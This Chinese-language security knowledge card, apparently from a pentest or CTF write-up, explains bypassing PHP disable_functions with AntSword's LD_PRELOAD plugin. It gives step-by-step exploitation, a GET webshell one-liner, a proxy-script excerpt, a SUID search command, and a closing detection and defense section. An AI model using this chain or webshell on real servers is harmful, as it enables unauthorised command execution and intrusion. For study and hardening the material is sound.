---
id: web-php-rce-disable-functions-ldpreload-antsword-proxy
title: 蚁剑 LD_PRELOAD 插件绕过 disable_functions：上传 .so 与 .antproxy.php，经本地 PHP 服务器代理执行 GET 命令
type: scenario
domain: web
path: web/php/rce
technique: php-disable-functions-ldpreload-antsword-proxy
aliases:
- 蚁剑 disable_functions 绕过
- as_bypass_php_disable_functions
- LD_PRELOAD 代理马
- .antproxy.php
- New WebServer Listen
- disable_functions LD_PRELOAD 插件
tags:
- php
- disable-functions
- ld-preload
- antsword
- webshell
- bypass
- putenv
- error-log
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V307
  verified_at: '2026-11-08T12:01:40+08:00'
  notes: 已对照原文与图13-20核对：disable_functions 含 pcntl/system/exec/shell_exec/popen/proc_open/passthru/symlink/link/readfile/debug_backtrace 等（图14）；插件 LD_PRELOAD 模式 putenv/error_log YES、PHP 7.0 x64 Linux、Web 根 /var/www/html/OAsystem、New WebServer Listen 127.0.0.1:62576，上传 /var/www/html/OAsystem/upload/.antproxy.php 与 /tmp/.56258ant_x64.so（图15）；代理脚本 fsockopen 127.0.0.1:62576、$url 改为 /shell.php、GET 型 shell 可用而 POST 失败（原文）、www-data 身份、SUID base32 读 flag02（图16-18）均与卡片一致。与通用 LD_PRELOAD 卡 related（cosine 0.9144，触发方式/新WebServer/代理马不同），保留；未实际复现插件。
---

## 一句话结论

当 `disable_functions` 禁用了 `system/exec/shell_exec` 等命令函数，但 `putenv`、`error_log`、`file_put_contents` 等仍可用时，可用蚁剑插件 `as_bypass_php_disable_functions` 的 LD_PRELOAD 模式：插件在 Web 目录写入 `.antproxy.php`、在 `/tmp` 写入 `.xxxxxant_x64.so`，并在 `127.0.0.1:62576` 启动一个加载了该 so 的 PHP WebServer，代理 PHP 通过 `fsockopen` 把外部请求转发给它，从而以 Web 进程身份执行系统命令；原文环境中代理只对 GET 型 shell 生效，POST 型 shell 利用失败。

## 原理

- **disable_functions 的边界**：`disable_functions` 是 PHP 层的函数黑名单，只让本进程内的这些函数不可调用；它不阻止 PHP 调用 `putenv()` 设置环境变量，也不阻止之后 fork/exec 出的子进程。Linux glibc 动态链接器会在新进程启动时读取 `LD_PRELOAD`，把指定共享库优先加载并执行其 constructor，从而在子进程中绕开 PHP 的函数限制。
- **插件做了什么**（原文截图可见）：插件先探测函数支持（本例 `dl` ✗、`putenv` ✓、`error_reporting` ✓、`error_log` ✓、`file_put_contents` ✓、`file_get_contents` ✗），确认 LD_PRELOAD 路径可用后，上传：
  - `/var/www/html/OAsystem/upload/.antproxy.php`（原文改为 `.demo.php`）：一个用 `fsockopen("127.0.0.1", 62576)` 转发请求的代理脚本；
  - `/tmp/.56258ant_x64.so`：待预加载的共享库。
- **为什么要代理 + 本地 WebServer**：Web 进程本身已加载了禁用函数配置，直接在当前进程里改 `LD_PRELOAD` 不会生效；插件改为在目标机启动一个新的 PHP WebServer（`New WebServer Listen 127.0.0.1:62576`，Web 根为 `/var/www/html/OAsystem`），在这个新进程上设置 `LD_PRELOAD` 加载恶意 so。新服务只监听回环地址，外部无法直接访问，于是再用 `.antproxy.php` 把请求从 Web 目录转发到 `127.0.0.1:62576`，形成“外部 → 代理马 → 本地新服务”的链路。
- **为什么命令能执行**：新起的 PHP 服务由插件的启动参数/环境控制，恶意 so 在进程启动时加载并劫持相关 libc 调用（或直接提供命令执行能力），因此在新服务上下文里 `system($_GET['cmd'])` 能真正派生进程；执行身份仍是 Web 用户（`www-data`），不是提权。
- **为什么只适合 GET**：原文实测 POST 型一句话在当前环境无法利用成功，GET 型 `<?php system($_GET['cmd']);?>` 正常；代理脚本对 `php://input` 的转发/目标服务处理 POST 存在兼容问题，属于该工具/环境的限制而非 disable_functions 绕过本身失败。原文未进一步解释原因。

## 触发条件

- PHP 版本满足插件要求（截图标注 PHP >= 5.3；本例为 PHP 7.0、64 位 Linux）。
- `disable_functions` 禁用 `system/exec/shell_exec/popen/proc_open/passthru` 等命令函数，但 `putenv`、`error_log`、`file_put_contents` 未被禁用（`dl` 是否可用不影响本例）。
- 当前用户对 Web 目录可写（能落代理 PHP），对 `/tmp` 可写（能落 so），且能在目标机启动新的 PHP 进程并监听 `127.0.0.1`（未限制 `proc_open`/`popen` 或已有 php-cgi/php CLI）。
- `open_basedir` 不限制 Web 目录与 `/tmp`；目标架构与插件生成的 so 匹配（x64）。
- 需要一个 GET 型命令执行脚本（如 `<?php system($_GET['cmd']);?>`），并由代理指向它。

## 利用步骤

1. 上传 `phpinfo()`（或其他方式）确认 `disable_functions` 列表与 `putenv`/`error_log`/`file_put_contents` 是否可用。
2. 用蚁剑连接已落地的 WebShell，打开 `as_bypass_php_disable_functions` 插件，选择 LD_PRELOAD 模式；填写 PHP 路径（`php`）与 Web 根目录（本例 `/var/www/html/OAsystem`）。
3. 点击开始，插件上传 `.antproxy.php` 与 `/tmp/.xxxxxant_x64.so`，并在 `127.0.0.1:62576` 启动新 WebServer。
4. 在 Web 目录新建 GET 型木马 `shell.php`：`<?php system($_GET['cmd']);?>`；把代理脚本中的 `$url` 改为 `/shell.php`（原文把默认指向的旧文件改成新 shell）。
5. 访问 `http://target/upload/.demo.php?cmd=id`，代理把请求转给本地 62576 的新服务并返回命令输出。
6. 用 `find / -perm -u=s -type f 2>/dev/null` 等命令继续提权/收集；本例通过 SUID `base32` 读取 root-only 文件（见关联卡）。

## PoC

代理脚本关键逻辑（原文 `.antproxy.php` 精简）：

```php
$host = "127.0.0.1";
$port = 62576;
$url = "/shell.php";
if (!empty($_SERVER['QUERY_STRING'])) { $url .= "?".$_SERVER['QUERY_STRING']; }
$fp = fsockopen($host, $port, $errno, $errstr, 30);
$method = "GET";
$post_data = "";
if ($_SERVER['REQUEST_METHOD']=='POST') { $method = "POST"; $post_data = file_get_contents('php://input'); }
$out = $method." ".$url." HTTP/1.1\r\n";
$out .= "Host: ".$host.":".$port."\r\n";
/* 转发 Content-Type、Content-length 与客户端头 */
fputs($fp, $out);
while($row=fread($fp, 4096)) { $response .= $row; }
echo substr($response, strpos($response, "\r\n\r\n")+4);
```

访问：

```http
GET /upload/.demo.php?cmd=ls%20/ HTTP/1.1
Host: target
```

## 变体与关联

- 通用 LD_PRELOAD 绕过（`putenv` + `mail()`/sendmail 子进程）见 `web-php-rce-disable-functions-ld-preload`：本卡是该机制在蚁剑插件中的“代理马 + 本地 WebServer”变体，触发方式、文件落地与环境要求不同。
- PHP 7.0–7.4.3 还可使用 `debug_backtrace` UAF 插件绕过（见 `web-php-rce-php7-backtrace-uaf-disable-functions-bypass`），原文也提到但命令执行不稳定。
- 其他绕过面：`.htaccess`/`php.ini` 写入、FastCGI/php-fpm 配置、`LD_PRELOAD` 通过 `error_log` 触发等。
- 落地代理脚本的文件名可自定义（原文改为 `.demo.php` 以隐蔽），但请求路径与 `$url` 必须对应。

## 检测与防御

- 在 `disable_functions` 中同时禁用 `putenv`、`error_log`、`file_put_contents`、`popen`、`proc_open` 等可用于设置环境/启动子进程的函数；用 `open_basedir` 限制 Web 目录与 `/tmp`。
- 禁止 Web 用户启动新进程/监听端口（容器/沙箱、seccomp、只读文件系统）；上传目录禁止执行 PHP。
- 检测：Web 目录出现 `.antproxy.php`/随机点文件、`/tmp` 出现 `*ant_x64.so`、进程列表出现 `php -S 127.0.0.1:62576` 之类的本地监听；审计对 `.antproxy.php`/伪装文件的请求与 `fsockopen` 行为。
- 应急：删除代理马与 so，结束新起的 PHP 进程，排查同目录其它落地文件与后续 SUID/提权动作。
